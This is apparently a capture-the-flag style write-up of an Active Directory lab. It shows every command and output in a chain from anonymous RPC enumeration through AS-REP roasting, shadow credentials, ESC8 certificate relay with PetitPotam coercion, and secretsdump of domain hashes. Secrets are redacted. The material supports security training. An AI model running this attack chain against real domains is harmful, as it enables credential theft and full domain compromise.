## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.
```
----
### IP Address
```IP
10.1.102.172
```
----
### Enumeration
- Network
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-08-06 11:51:14Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Issuer: commonName=DC01.shadow.gate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-05T11:38:48
| Not valid after:  2027-02-04T11:38:48
| MD5:     f9e0 566d 1bea 8d4a 536e fd0c 394c 8a94
| SHA-1:   9b64 33c5 c583 52ee 45c7 45b5 95b2 eaf9 5c90 5a31
| SHA-256: 1328 78c6 f587 bca0 2c23 16e3 9654 0ca7 f6e9 66fc c8b8 4c98 d7a6 a5d0 bac1 88a1
| rdp-ntlm-info:
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   DNS_Tree_Name: shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-08-06T11:52:22+00:00
|_ssl-date: 2026-08-06T11:53:02+00:00; +1s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
50990/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
58638/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
58641/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
58651/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
58667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
58685/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```
----
#### System Information
```Info
Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   DNS_Tree_Name: shadow.gate
|   Product_Version: 10.0.20348
```
----
#### SMB
```bash
$ nxc smb 10.1.102.172
SMB         10.1.102.172    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)

$ smbclient -L //10.1.102.172/ -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.1.102.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

─$ nxc smb 10.1.102.172 -u '' -p ''
SMB         10.1.102.172    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
SMB         10.1.102.172    445    DC01             [+] shadow.gate\:
```
- Nothing Found inside `SMB` - `Shares`
----
##### RPC Client
```bash
rpcclient -U "" -N 10.1.102.172
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ATHENA] rid:[0x44f]
user:[mbrownlee] rid:[0x450]
user:[bbrown] rid:[0x455]
user:[jtrueblood] rid:[0x456]
user:[jsmith] rid:[0x458]
user:[clocke] rid:[0x459]
user:[tclarke] rid:[0x45a]
user:[jbradford] rid:[0x45b]
user:[amoss] rid:[0x45c]

rpcclient $> administrator
acces denied

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[ADCS-Reader] rid:[0x641]
```
-----
##### LDAP
```bash
$ ldapsearch -x \
-H ldap://10.1.102.172 \
-b "DC=shadow,DC=gate"
# extended LDIF
#
# LDAPv3
# base <DC=shadow,DC=gate> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090D5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```
-----
##### Users Names
- List of user found using `RPCCLIENT`
```users
Administrator
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
krbtgt
```
- Checking Valid users
```bash
$ kerbrute userenum \
-d shadow.gate \
--dc 10.1.102.172 \
users.txt
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 08/06/26 - Ronnie Flathers @ropnop

2026/08/06 08:19:11 >  Using KDC(s):
2026/08/06 08:19:11 >  	10.1.102.172:88

2026/08/06 08:19:11 >  [+] VALID USERNAME:	 ATHENA@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 mbrownlee@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 bbrown@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 Administrator@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 jbradford@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 tclarke@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 amoss@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 jsmith@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 clocke@shadow.gate
2026/08/06 08:19:11 >  [+] VALID USERNAME:	 jtrueblood@shadow.gate
2026/08/06 08:19:11 >  Done! Tested 11 usernames (10 valid) in 0.813 seconds
```
---- 
##### Impacket
- `AS-REP Roasting` - If any account has pre-authentication disabled
```bash
impacket-GetNPUsers shadow.gate/ \
-usersfile users.txt \
-no-pass \
-dc-ip 10.1.102.172
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ATHENA doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mbrownlee doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$[hash omitted]
[-] User jsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clocke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tclarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jbradford doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User amoss doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```
----
##### HashCat 
- Password Cracking 
```bash
$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$[hash omitted]
```
- Username - `jtrueblood`
- Password - `[password omitted]` 
---
##### SMB
- Using Creds - `jtrublood/[password omitted]`
```bash
$ smbmap -H 10.1.102.172 -u jtrueblood -p [password omitted] -r SYSVOL

[+] IP: 10.1.102.172:445	Name: shadow.gate         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
	./SYSVOL
	dr--r--r--                0 Sun Jan 11 21:44:51 2026	.
	dr--r--r--                0 Sun Jan 11 21:44:51 2026	..
	dr--r--r--                0 Sun Jan 11 21:44:51 2026	shadow.gate
[*] Closed 1 connections
```
- Nothing interesting here too 
- Checked all directories nothing find interesting
----
##### BloodHound
- Collect all data
```bash
$ nxc ldap $TARGET -u jtrueblood -p [password omitted] --bloodhound --collection All --dns-server 10.1.102.172
LDAP        10.1.102.172    389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never)
LDAP        10.1.102.172    389    DC01             [+] shadow.gate\jtrueblood:[password omitted]
LDAP        10.1.102.172    389    DC01             Resolved collection methods: localadmin, rdp, acl, objectprops, dcom, psremote, group, trusts, session, container
LDAP        10.1.102.172    389    DC01             Done in 0M 52S
LDAP        10.1.102.172    389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.102.172_2026-08-06_085206_bloodhound.zip
```
- Found user - `jtrueblood` -> outbound -> GenericAll -> `BBROWN@SHADOW.GATE`
----
##### Certipy-ad
- With the following command we issue the attack and are succesful. We retrieve the NT hash of `bbrown`.
```bash
certipy-ad shadow auto \
-u 'jtrueblood@shadow.gate' \
-p '[password omitted]' \
-account bbrown \
-dc-ip 10.1.102.172
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'bbrown'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '766f0e6bb6334821b32ece24ce05b05b'
[*] Adding Key Credential with device ID '766f0e6bb6334821b32ece24ce05b05b' to the Key Credentials for 'bbrown'
[*] Successfully added Key Credential with device ID '766f0e6bb6334821b32ece24ce05b05b' to the Key Credentials for 'bbrown'
[*] Authenticating as 'bbrown' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bbrown@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bbrown.ccache'
[*] Wrote credential cache to 'bbrown.ccache'
[*] Trying to retrieve NT hash for 'bbrown'
[*] Restoring the old Key Credentials for 'bbrown'
[*] Successfully restored the old Key Credentials for 'bbrown'
[*] NT hash for 'bbrown': [hash omitted]
```
- Found - Hash - `bbrown` - [hash omitted]
----
##### Hashcat
- Decrypt the hash
```bash
$haiti '[hash omitted]' --hashcat-only
MD5 [HC: 0]
LM [HC: 3000]
NTLM [HC: 1000]

$hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
[hash omitted]:[password omitted]
```
- Creds - 
	Username - `bbrown`
	Password - `[password omitted]`
-----
##### Certipy-ad
- We use certipy again but this time we query for all templates.
```bash
certipy-ad find \
-u 'bbrown@shadow.gate' \
-hashes :[hash omitted] \
-dc-ip 10.1.102.172 \
-enabled \
-text -stdout

Certificate Authorities
  0
    CA Name                             : shadow-DC01-CA
    DNS Name                            : DC01.shadow.gate
    Certificate Subject                 : CN=shadow-DC01-CA, DC=shadow, DC=gate
    Certificate Serial Number           : 749A4BA2BEA3CFBC41ECDFAEE502E46C
    Certificate Validity Start          : 2026-01-12 02:50:31+00:00
    Certificate Validity End            : 2046-01-12 03:00:31+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHADOW.GATE\Administrators
      Access Rights
        ManageCa                        : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        ManageCertificates              : SHADOW.GATE\Administrators
                                          SHADOW.GATE\Domain Admins
                                          SHADOW.GATE\Enterprise Admins
        Enroll                          : SHADOW.GATE\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP. 
```
- `#ESC8` -  Web Enrollment is enabled over HTTP.
- Use `ntilmrelay` to `DomainController` - and capture DC01
----
##### Access as dc01$
- First, we start a relay using certipy to capture NTLM authentication and relay to the AD CS Web Enrollment endpoint, requesting a certificate using the `DomainController` template. If successful, it issues a certificate for the relayed identity, enabling authentication to the Active Directory services.
```bash
$ impacket-ntlmrelayx \
--adcs \
--template DomainController \
-t http://10.1.102.172/certsrv/certfnsh.asp \
-smb2support \
-debug
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled
```
- Send request to the `DomainController`
- Through - `#PetitPotam` as it is vulnerable or misconfigured by #ESC8
```bash
$ python3 PetitPotam.py \
-u bbrown \
-p '[password omitted]' \
10.200.78.20 \
DC01.shadow.gate

Trying pipe lsarpc
[-] Connecting to ncacn_np:DC01.shadow.gate[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```
- Capture the Packet
```bash
$ impacket-ntlmrelayx \
--adcs \
--template DomainController \
-t http://10.1.102.172/certsrv/certfnsh.asp \
-smb2support \
-debug

[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.1.102.172, attacking target http://10.1.102.172
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.1.102.172 against http://10.1.102.172 SUCCEED [1]
[*] http:///@10.1.102.172 [1] -> Generating CSR...
[*] http:///@10.1.102.172 [1] -> CSR generated!
[*] http:///@10.1.102.172 [1] -> Getting certificate...
[*] http:///@10.1.102.172 [1] -> GOT CERTIFICATE! ID 3
[*] http:///@10.1.102.172 [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
[*] http:///@10.1.102.172 [1] -> Certificate successfully written to file
[*] (SMB): Received connection from 10.1.102.172, attacking target http://10.1.102.172
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.1.102.172 against http://10.1.102.172 SUCCEED [2]
[*] http:///@10.1.102.172 [2] -> Skipping user  since attack was already performed
```
- Got the Certificate `./DC01.shadow.gate.pfx`
----
##### Certipy
- `Certipy` this time to auth `pfx` and dump `DC01` hash
```bash
$ certipy-ad auth \
-pfx DC01.shadow.gate.pfx \
-dc-ip 10.1.102.172
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': [lmhash omitted]:[nthash omitted]
```
- Hash Dumped 
-----
##### Secret-Dump 
- Using `DC01` hash to dump all secrets hash available
```bash
$ impacket-secretsdump \
'shadow.gate/DC01$@10.1.102.172' \
-hashes [lmhash omitted]:[nthash omitted]
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:[lmhash omitted]:[nthash omitted]:::
Guest:501:[lmhash omitted]:[nthash omitted]:::
krbtgt:502:[lmhash omitted]:[nthash omitted]:::
shadow.gate\ATHENA:1103:[lmhash omitted]:[nthash omitted]:::
shadow.gate\mbrownlee:1104:[lmhash omitted]:[nthash omitted]:::
shadow.gate\bbrown:1109:[lmhash omitted]:[nthash omitted]:::
shadow.gate\jtrueblood:1110:[lmhash omitted]:[nthash omitted]:::
shadow.gate\jsmith:1112:[lmhash omitted]:[nthash omitted]:::
shadow.gate\clocke:1113:[lmhash omitted]:[nthash omitted]:::
shadow.gate\tclarke:1114:[lmhash omitted]:[nthash omitted]:::
shadow.gate\jbradford:1115:[lmhash omitted]:[nthash omitted]:::
shadow.gate\amoss:1116:[lmhash omitted]:[nthash omitted]:::
DC01$:1000:[lmhash omitted]:[nthash omitted]:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:[key omitted]
Administrator:aes128-cts-hmac-sha1-96:[key omitted]
Administrator:des-cbc-md5:[key omitted]
krbtgt:aes256-cts-hmac-sha1-96:[key omitted]
krbtgt:aes128-cts-hmac-sha1-96:[key omitted]
krbtgt:des-cbc-md5:[key omitted]
shadow.gate\ATHENA:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\ATHENA:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\ATHENA:des-cbc-md5:[key omitted]
shadow.gate\mbrownlee:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\mbrownlee:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\mbrownlee:des-cbc-md5:[key omitted]
shadow.gate\bbrown:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\bbrown:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\bbrown:des-cbc-md5:[key omitted]
shadow.gate\jtrueblood:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\jtrueblood:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\jtrueblood:des-cbc-md5:[key omitted]
shadow.gate\jsmith:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\jsmith:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\jsmith:des-cbc-md5:[key omitted]
shadow.gate\clocke:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\clocke:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\clocke:des-cbc-md5:[key omitted]
shadow.gate\tclarke:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\tclarke:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\tclarke:des-cbc-md5:[key omitted]
shadow.gate\jbradford:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\jbradford:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\jbradford:des-cbc-md5:[key omitted]
shadow.gate\amoss:aes256-cts-hmac-sha1-96:[key omitted]
shadow.gate\amoss:aes128-cts-hmac-sha1-96:[key omitted]
shadow.gate\amoss:des-cbc-md5:[key omitted]
DC01$:aes256-cts-hmac-sha1-96:[key omitted]
DC01$:aes128-cts-hmac-sha1-96:[key omitted]
DC01$:des-cbc-md5:[key omitted]
[*] Cleaning up...
```
- We Need the hash for `krbtgt`
```hash
krbtgt:502:[lmhash omitted]:[nthash omitted]:::
```
# END